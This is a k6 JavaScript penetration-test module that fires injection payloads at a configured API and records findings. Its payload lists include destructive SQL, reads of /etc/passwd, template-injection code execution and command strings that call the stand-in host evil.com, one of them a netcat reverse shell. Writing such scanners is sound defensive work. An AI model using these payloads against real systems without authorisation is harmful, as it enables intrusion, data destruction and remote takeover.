/**
 * Injection Attack Penetration Tests
 * Tests for SQL, NoSQL, Command, and other injection vulnerabilities
 */

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Counter } from 'k6/metrics';

// Metrics
const injectionVulnerabilities = new Counter('injection_vulnerabilities');
const injectionTestsRun = new Counter('injection_tests_run');
const criticalInjections = new Counter('critical_injections');

export class InjectionTests {
  constructor(config) {
    this.config = config;
    this.baseUrl = config.target.baseUrl;
    this.apiPrefix = config.target.apiPrefix;
    this.findings = [];
    this.payloads = config.payloads;
  }

  async runAllTests() {
    console.log('ðŸ’‰ Running Injection Penetration Tests');
    
    const tests = [
      this.testSQLInjection,
      this.testNoSQLInjection,
      this.testCommandInjection,
      this.testLDAPInjection,
      this.testXPathInjection,
      this.testTemplateInjection,
      this.testHeaderInjection,
      this.testJSONInjection
    ];

    for (const test of tests) {
      try {
        await test.call(this);
        injectionTestsRun.add(1);
      } catch (error) {
        console.error(`Injection test failed: ${error.message}`);
      }
      sleep(1);
    }

    return this.findings;
  }

  async testSQLInjection() {
    console.log('Testing SQL Injection...');
    
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR 1=1#",
      "admin'--",
      "admin' /*",
      "' OR 'x'='x",
      "') OR ('1'='1",
      "' OR 1=1 LIMIT 1 --",
      "1' ORDER BY 1--+",
      "1' ORDER BY 2--+",
      "1' ORDER BY 3--+",
      "' UNION SELECT NULL--",
      "' UNION SELECT 1,2,3--",
      "' AND SUBSTRING(@@version,1,1)='5'--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ];

    // Test endpoints that might be vulnerable to SQL injection
    const testEndpoints = [
      { endpoint: '/users/search', param: 'q', method: 'GET' },
      { endpoint: '/content/search', param: 'query', method: 'GET' },
      { endpoint: '/auth/login', param: 'email', method: 'POST' },
      { endpoint: '/users/profile', param: 'userId', method: 'GET' },
      { endpoint: '/payments/history', param: 'userAddress', method: 'GET' },
      { endpoint: '/content/filter', param: 'category', method: 'GET' },
      { endpoint: '/admin/users', param: 'filter', method: 'GET' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of sqlPayloads) {
        await this.testSQLInjectionOnEndpoint(endpoint, payload);
        sleep(0.1); // Rate limiting
      }
    }
  }

  async testSQLInjectionOnEndpoint(endpoint, payload) {
    let response;
    
    if (endpoint.method === 'GET') {
      const params = new URLSearchParams();
      params.set(endpoint.param, payload);
      response = http.get(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}?${params.toString()}`);
    } else if (endpoint.method === 'POST') {
      const data = {};
      data[endpoint.param] = payload;
      response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
        JSON.stringify(data),
        { headers: { 'Content-Type': 'application/json' } }
      );
    }

    if (response) {
      // Check for SQL injection indicators
      const indicators = [
        'mysql_fetch_array',
        'ORA-01756',
        'Microsoft OLE DB Provider for ODBC Drivers',
        'PostgreSQL query failed',
        'Warning: mysql_',
        'MySQLSyntaxErrorException',
        'valid MySQL result',
        'check the manual that corresponds to your MySQL server version',
        'Unknown column',
        'where clause',
        'SqlException',
        'OleDbException',
        'JET Database Engine',
        'Access Database Engine',
        'SQLite error',
        'sqlite3.OperationalError',
        'SQLite3::SQLException',
        'Oracle error',
        'Oracle driver',
        'quoted string not properly terminated'
      ];

      const responseBody = response.body.toLowerCase();
      const hasIndicator = indicators.some(indicator => 
        responseBody.includes(indicator.toLowerCase())
      );

      // Check for time-based SQL injection (response time > 5 seconds)
      const isTimeBased = response.timings.duration > 5000;

      // Check for boolean-based SQL injection (different response lengths)
      const isBooleanBased = this.checkBooleanBasedSQLI(response, payload);

      if (hasIndicator || isTimeBased || isBooleanBased || response.status === 500) {
        this.addFinding({
          category: 'Injection',
          test: 'SQL Injection',
          vulnerability: 'SQL Injection Vulnerability',
          severity: 'critical',
          description: `SQL injection vulnerability detected in ${endpoint.endpoint}`,
          evidence: {
            endpoint: endpoint.endpoint,
            parameter: endpoint.param,
            payload: payload,
            response: response.status,
            responseTime: response.timings.duration,
            indicators: indicators.filter(ind => responseBody.includes(ind.toLowerCase())),
            responseBody: response.body.substring(0, 500)
          },
          impact: 'Attackers can read, modify, or delete database data',
          recommendation: 'Use parameterized queries and input validation'
        });

        injectionVulnerabilities.add(1);
        criticalInjections.add(1);
      }
    }
  }

  async testNoSQLInjection() {
    console.log('Testing NoSQL Injection...');
    
    const noSQLPayloads = [
      { "$ne": null },
      { "$ne": "" },
      { "$gt": "" },
      { "$regex": ".*" },
      { "$where": "1==1" },
      { "$or": [{"a": 1}, {"b": 2}] },
      { "$and": [{"a": 1}, {"b": 2}] },
      "'; return true; var dummy='",
      "'; return 'a'=='a'; var dummy='",
      "1'; return true; var dummy='1",
      "true, $where: '1 == 1'",
      ", $where: '1 == 1'",
      "$where: '1 == 1'",
      "', $where: '1 == 1', $comment: '",
      "', $or: [ {}, { 'a':'a"
    ];

    const testEndpoints = [
      { endpoint: '/users/search', param: 'q', method: 'POST' },
      { endpoint: '/content/search', param: 'query', method: 'POST' },
      { endpoint: '/auth/login', param: 'email', method: 'POST' },
      { endpoint: '/users/filter', param: 'criteria', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of noSQLPayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );

        // Check for NoSQL injection indicators
        const indicators = [
          'MongoError',
          'CastError',
          'ValidationError',
          'mongo',
          'mongoose',
          'TypeError: Cannot read property',
          'SyntaxError: Unexpected token',
          'ReferenceError',
          'invalid query'
        ];

        const responseBody = response.body.toLowerCase();
        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator.toLowerCase())
        );

        if (hasIndicator || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'NoSQL Injection',
            vulnerability: 'NoSQL Injection Vulnerability',
            severity: 'critical',
            description: `NoSQL injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: JSON.stringify(payload),
              response: response.status,
              indicators: indicators.filter(ind => responseBody.includes(ind.toLowerCase())),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can bypass authentication and access unauthorized data',
            recommendation: 'Use proper input validation and sanitization for NoSQL queries'
          });

          injectionVulnerabilities.add(1);
          criticalInjections.add(1);
        }

        sleep(0.1);
      }
    }
  }

  async testCommandInjection() {
    console.log('Testing Command Injection...');
    
    const commandPayloads = [
      "; ls -la",
      "| whoami",
      "&& cat /etc/passwd",
      "`id`",
      "$(whoami)",
      "; ping -c 4 127.0.0.1",
      "| ping -n 4 127.0.0.1",
      "&& ping -c 4 127.0.0.1",
      "`ping -c 4 127.0.0.1`",
      "$(ping -c 4 127.0.0.1)",
      "; sleep 5",
      "| timeout 5",
      "&& sleep 5",
      "`sleep 5`",
      "$(sleep 5)",
      "; curl http://evil.com",
      "| wget http://evil.com",
      "&& nc -e /bin/sh evil.com 4444"
    ];

    const testEndpoints = [
      { endpoint: '/content/upload', param: 'filename', method: 'POST' },
      { endpoint: '/users/export', param: 'format', method: 'POST' },
      { endpoint: '/admin/backup', param: 'path', method: 'POST' },
      { endpoint: '/content/convert', param: 'options', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of commandPayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const startTime = Date.now();
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );
        const responseTime = Date.now() - startTime;

        // Check for command injection indicators
        const indicators = [
          'uid=',
          'gid=',
          'groups=',
          'root:',
          '/bin/',
          '/etc/passwd',
          'PING',
          'ping statistics',
          '64 bytes from',
          'sh: ',
          'command not found',
          'Permission denied',
          'No such file or directory'
        ];

        const responseBody = response.body;
        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator)
        );

        // Check for time-based command injection (sleep/ping commands)
        const isTimeBased = responseTime > 4000 && payload.includes('sleep');

        if (hasIndicator || isTimeBased || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'Command Injection',
            vulnerability: 'Command Injection Vulnerability',
            severity: 'critical',
            description: `Command injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              responseTime: responseTime,
              indicators: indicators.filter(ind => responseBody.includes(ind)),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can execute arbitrary commands on the server',
            recommendation: 'Avoid system calls with user input, use input validation and sanitization'
          });

          injectionVulnerabilities.add(1);
          criticalInjections.add(1);
        }

        sleep(0.2);
      }
    }
  }

  async testLDAPInjection() {
    console.log('Testing LDAP Injection...');
    
    const ldapPayloads = [
      "*",
      "*)(&",
      "*))%00",
      "*()|%26'",
      "*()|&'",
      "*(|(mail=*))",
      "*(|(objectclass=*))",
      "*)(uid=*))(|(uid=*",
      "*)(|(cn=*))",
      "admin)(&(password=*))",
      "admin))(|(|",
      "*)(objectClass=*))(&(objectClass=void",
      "*)(&(objectClass=*)(cn=*))",
      "*)(|(objectClass=*)(cn=*))"
    ];

    const testEndpoints = [
      { endpoint: '/auth/ldap', param: 'username', method: 'POST' },
      { endpoint: '/users/ldap-search', param: 'filter', method: 'POST' },
      { endpoint: '/admin/ldap-query', param: 'query', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of ldapPayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );

        // Check for LDAP injection indicators
        const indicators = [
          'javax.naming.directory',
          'LdapException',
          'LDAP: error code',
          'Invalid DN syntax',
          'Bad search filter',
          'javax.naming.InvalidNameException',
          'javax.naming.directory.InvalidSearchFilterException'
        ];

        const responseBody = response.body;
        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator)
        );

        if (hasIndicator || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'LDAP Injection',
            vulnerability: 'LDAP Injection Vulnerability',
            severity: 'high',
            description: `LDAP injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              indicators: indicators.filter(ind => responseBody.includes(ind)),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can bypass LDAP authentication and access unauthorized data',
            recommendation: 'Use proper LDAP query parameterization and input validation'
          });

          injectionVulnerabilities.add(1);
        }

        sleep(0.1);
      }
    }
  }

  async testXPathInjection() {
    console.log('Testing XPath Injection...');
    
    const xpathPayloads = [
      "' or '1'='1",
      "' or 1=1 or ''='",
      "x' or name()='username' or 'x'='y",
      "' or position()=1 or ''='",
      "' or count(parent::*[position()=1])=0 or ''='",
      "' or string-length(name(..))>0 or ''='",
      "' or substring(//user[position()=1]/child::node()[position()=2],1,1)='a",
      "admin' or '1'='1' or 'a'='a",
      "') or ('1'='1",
      "' or text()='admin' or ''='"
    ];

    const testEndpoints = [
      { endpoint: '/users/xml-search', param: 'query', method: 'POST' },
      { endpoint: '/content/xml-filter', param: 'filter', method: 'POST' },
      { endpoint: '/admin/xml-query', param: 'xpath', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of xpathPayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );

        // Check for XPath injection indicators
        const indicators = [
          'XPathException',
          'XPath syntax error',
          'Invalid XPath',
          'javax.xml.xpath.XPathExpressionException',
          'XPath expression',
          'XPathEvalException',
          'Invalid predicate'
        ];

        const responseBody = response.body;
        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator)
        );

        if (hasIndicator || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'XPath Injection',
            vulnerability: 'XPath Injection Vulnerability',
            severity: 'high',
            description: `XPath injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              indicators: indicators.filter(ind => responseBody.includes(ind)),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can access unauthorized XML data',
            recommendation: 'Use parameterized XPath queries and input validation'
          });

          injectionVulnerabilities.add(1);
        }

        sleep(0.1);
      }
    }
  }

  async testTemplateInjection() {
    console.log('Testing Template Injection...');
    
    const templatePayloads = [
      "{{7*7}}",
      "${7*7}",
      "#{7*7}",
      "{{config}}",
      "{{config.items()}}",
      "${T(java.lang.System).getProperty('java.version')}",
      "{{''.__class__.__mro__[2].__subclasses__()}}",
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      "<%= 7*7 %>",
      "<%= system('id') %>",
      "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}",
      "{{\"\".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}}"
    ];

    const testEndpoints = [
      { endpoint: '/content/template', param: 'template', method: 'POST' },
      { endpoint: '/users/email-template', param: 'content', method: 'POST' },
      { endpoint: '/admin/report-template', param: 'template', method: 'POST' },
      { endpoint: '/notifications/template', param: 'message', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of templatePayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );

        // Check for template injection indicators
        const responseBody = response.body;
        const indicators = [
          '49', // 7*7
          'java.version',
          'uid=',
          'gid=',
          'TemplateException',
          'Template error',
          'Syntax error in template'
        ];

        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator)
        );

        if (hasIndicator || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'Template Injection',
            vulnerability: 'Server-Side Template Injection',
            severity: 'critical',
            description: `Template injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              indicators: indicators.filter(ind => responseBody.includes(ind)),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can execute arbitrary code on the server',
            recommendation: 'Use safe template engines and avoid user input in templates'
          });

          injectionVulnerabilities.add(1);
          criticalInjections.add(1);
        }

        sleep(0.1);
      }
    }
  }

  async testHeaderInjection() {
    console.log('Testing Header Injection...');
    
    const headerPayloads = [
      "test\r\nX-Injected-Header: injected",
      "test\nX-Injected-Header: injected",
      "test\r\n\r\n<script>alert('XSS')</script>",
      "test%0d%0aX-Injected-Header:%20injected",
      "test%0aX-Injected-Header:%20injected",
      "test\r\nSet-Cookie: injected=true",
      "test\r\nLocation: http://evil.com"
    ];

    const testEndpoints = [
      { endpoint: '/users/redirect', param: 'url', method: 'GET' },
      { endpoint: '/content/download', param: 'filename', method: 'GET' },
      { endpoint: '/auth/callback', param: 'redirect_uri', method: 'GET' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of headerPayloads) {
        const params = new URLSearchParams();
        params.set(endpoint.param, payload);
        
        const response = http.get(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}?${params.toString()}`);

        // Check for header injection in response headers
        const responseHeaders = Object.keys(response.headers).map(key => 
          `${key}: ${response.headers[key]}`
        ).join('\n');

        const injectionIndicators = [
          'X-Injected-Header',
          'injected=true',
          'evil.com'
        ];

        const hasInjection = injectionIndicators.some(indicator => 
          responseHeaders.includes(indicator) || response.body.includes(indicator)
        );

        if (hasInjection) {
          this.addFinding({
            category: 'Injection',
            test: 'Header Injection',
            vulnerability: 'HTTP Header Injection',
            severity: 'medium',
            description: `Header injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              responseHeaders: responseHeaders,
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can manipulate HTTP headers and potentially perform XSS or redirect attacks',
            recommendation: 'Validate and sanitize all user input used in HTTP headers'
          });

          injectionVulnerabilities.add(1);
        }

        sleep(0.1);
      }
    }
  }

  async testJSONInjection() {
    console.log('Testing JSON Injection...');
    
    const jsonPayloads = [
      '{"test": "value", "injected": "true"}',
      '", "injected": "true", "test": "',
      '\\", \\"injected\\": \\"true\\", \\"test\\": \\"',
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"__proto__": {"isAdmin": true}}',
      '{"constructor": {"prototype": {"isAdmin": true}}}',
      '{"admin": true, "role": "admin"}'
    ];

    const testEndpoints = [
      { endpoint: '/users/update', param: 'data', method: 'POST' },
      { endpoint: '/content/metadata', param: 'metadata', method: 'POST' },
      { endpoint: '/payments/process', param: 'paymentData', method: 'POST' }
    ];

    for (const endpoint of testEndpoints) {
      for (const payload of jsonPayloads) {
        const data = {};
        data[endpoint.param] = payload;
        
        const response = http.post(`${this.baseUrl}${this.apiPrefix}${endpoint.endpoint}`,
          JSON.stringify(data),
          { headers: { 'Content-Type': 'application/json' } }
        );

        // Check for JSON injection indicators
        const responseBody = response.body;
        const indicators = [
          'injected',
          'isAdmin',
          'SyntaxError',
          'JSON.parse',
          'Unexpected token',
          'Invalid JSON'
        ];

        const hasIndicator = indicators.some(indicator => 
          responseBody.includes(indicator)
        );

        if (hasIndicator || response.status === 500) {
          this.addFinding({
            category: 'Injection',
            test: 'JSON Injection',
            vulnerability: 'JSON Injection Vulnerability',
            severity: 'medium',
            description: `JSON injection vulnerability detected in ${endpoint.endpoint}`,
            evidence: {
              endpoint: endpoint.endpoint,
              parameter: endpoint.param,
              payload: payload,
              response: response.status,
              indicators: indicators.filter(ind => responseBody.includes(ind)),
              responseBody: response.body.substring(0, 500)
            },
            impact: 'Attackers can manipulate JSON data and potentially bypass security controls',
            recommendation: 'Use proper JSON parsing and validation'
          });

          injectionVulnerabilities.add(1);
        }

        sleep(0.1);
      }
    }
  }

  // Helper methods
  checkBooleanBasedSQLI(response, payload) {
    // This is a simplified check - in a real implementation,
    // you would compare responses from true/false conditions
    const trueConditions = ["' OR '1'='1", "' OR 1=1--"];
    const falseConditions = ["' OR '1'='2", "' OR 1=2--"];
    
    return trueConditions.includes(payload) && response.status === 200;
  }

  addFinding(finding) {
    this.findings.push({
      ...finding,
      timestamp: new Date().toISOString(),
      testId: `injection_${this.findings.length + 1}`
    });
  }
}